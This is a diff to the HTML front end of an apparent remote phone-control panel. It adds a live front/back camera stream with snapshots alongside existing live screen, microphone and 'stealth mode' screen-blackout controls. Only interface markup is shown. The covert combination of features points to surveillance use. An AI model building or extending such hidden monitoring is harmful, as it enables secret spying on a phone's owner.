@@ -181,6 +181,30 @@
               <!-- HTML5 Live Stream Canvas -->
               <canvas id="live-screen-canvas" width="280" height="460" class="w-full h-full object-contain cursor-crosshair select-none"></canvas>
 
+              <!-- Live Camera Stream Overlay (Active during Cam Cast) -->
+              <div id="live-cam-container" class="hidden absolute inset-0 bg-black flex flex-col items-center justify-center overflow-hidden z-20">
+                <img id="live-cam-stream-img" class="w-full h-full object-cover" alt="Live Camera Feed">
+                <!-- Cam Status Overlay Badge -->
+                <div class="absolute top-2.5 left-2.5 px-2.5 py-1 rounded-full bg-red-950/90 border border-red-700/80 text-red-300 text-[10px] font-mono flex items-center space-x-1.5 shadow-lg">
+                  <span class="w-2 h-2 rounded-full bg-red-500 animate-ping"></span>
+                  <span id="cam-facing-badge">Front Cam (Live)</span>
+                </div>
+                <!-- Quick Cam Controls Floating at Bottom -->
+                <div class="absolute bottom-3 inset-x-3 flex items-center justify-between bg-gray-950/80 backdrop-blur-md px-3 py-1.5 rounded-2xl border border-gray-800 text-xs">
+                  <button onclick="switchCameraFacing()" title="Switch Front/Back Camera" class="text-cyan-400 hover:text-cyan-300 flex items-center space-x-1 text-[11px] font-medium">
+                    <i class="fa-solid fa-camera-rotate"></i>
+                    <span>Switch</span>
+                  </button>
+                  <button onclick="captureCameraSnapshot()" title="Capture High-Res Cam Photo" class="px-2.5 py-1 rounded-lg bg-cyan-600 hover:bg-cyan-500 text-white font-bold text-[10px] flex items-center space-x-1 shadow">
+                    <i class="fa-solid fa-camera"></i>
+                    <span>Cam Snap</span>
+                  </button>
+                  <button onclick="toggleLiveCameraStream()" title="Exit Cam Cast" class="text-red-400 hover:text-red-300 text-[11px] font-medium">
+                    <span>Close</span>
+                  </button>
+                </div>
+              </div>
+
               <!-- Standby / Blind-Tap Overlay (Shown when stream is idle) -->
               <div id="screen-standby-overlay" class="absolute inset-0 bg-[#04060c]/90 flex flex-col items-center justify-between p-4 pointer-events-none">
                 <div class="text-[11px] text-gray-500 font-mono text-center pt-2">
@@ -222,10 +246,10 @@
           </div>
 
           <!-- Web Controller Action Toolbar -->
-          <div class="mt-4 pt-3 border-t border-gray-800/80 grid grid-cols-2 sm:grid-cols-5 gap-2 text-xs">
+          <div class="mt-4 pt-3 border-t border-gray-800/80 grid grid-cols-3 sm:grid-cols-6 gap-2 text-xs">
             <button onclick="toggleWebStream()" id="btn-web-stream" class="p-2.5 rounded-xl bg-cyan-600 hover:bg-cyan-500 text-white font-semibold flex items-center justify-center space-x-1.5 transition shadow-lg shadow-cyan-600/20">
               <i class="fa-solid fa-play" id="icon-web-stream"></i>
-              <span id="text-web-stream">Start Stream</span>
+              <span id="text-web-stream">Start</span>
             </button>
             <button onclick="sendStealthMode()" title="Make physical phone screen black" class="p-2.5 rounded-xl bg-purple-950/80 hover:bg-purple-900 border border-purple-800/60 text-purple-200 font-medium flex items-center justify-center space-x-1.5 transition">
               <i class="fa-solid fa-eye-slash"></i>
@@ -233,15 +257,19 @@
             </button>
             <button onclick="sendPhoneKey(26)" title="Press Power button" class="p-2.5 rounded-xl bg-gray-800 hover:bg-gray-700 border border-gray-700 text-gray-200 font-medium flex items-center justify-center space-x-1.5 transition">
               <i class="fa-solid fa-power-off text-amber-400"></i>
-              <span>Wake/Power</span>
+              <span>Power</span>
             </button>
             <button onclick="captureWebSnapshot()" title="Capture Screenshot to PC" class="p-2.5 rounded-xl bg-gray-800 hover:bg-gray-700 border border-gray-700 text-gray-200 font-medium flex items-center justify-center space-x-1.5 transition">
               <i class="fa-solid fa-camera text-cyan-400"></i>
-              <span>Snapshot</span>
+              <span>Snap</span>
             </button>
             <button onclick="toggleLiveAudioStream()" id="btn-audio-stream" title="Continuous Live Audio Stream (Toggle ON/OFF)" class="p-2.5 rounded-xl bg-gray-800 hover:bg-gray-700 border border-gray-700 text-gray-200 font-medium flex items-center justify-center space-x-1.5 transition">
               <i class="fa-solid fa-microphone-lines text-emerald-400" id="icon-audio-stream"></i>
-              <span id="text-audio-stream">Live Audio</span>
+              <span id="text-audio-stream">Audio</span>
+            </button>
+            <button onclick="toggleLiveCameraStream()" id="btn-cam-stream" title="Live Camera Casting (Front / Back Camera)" class="p-2.5 rounded-xl bg-gray-800 hover:bg-gray-700 border border-gray-700 text-gray-200 font-medium flex items-center justify-center space-x-1.5 transition">
+              <i class="fa-solid fa-video text-cyan-400" id="icon-cam-stream"></i>
+              <span id="text-cam-stream">Live Cam</span>
             </button>
           </div>
 
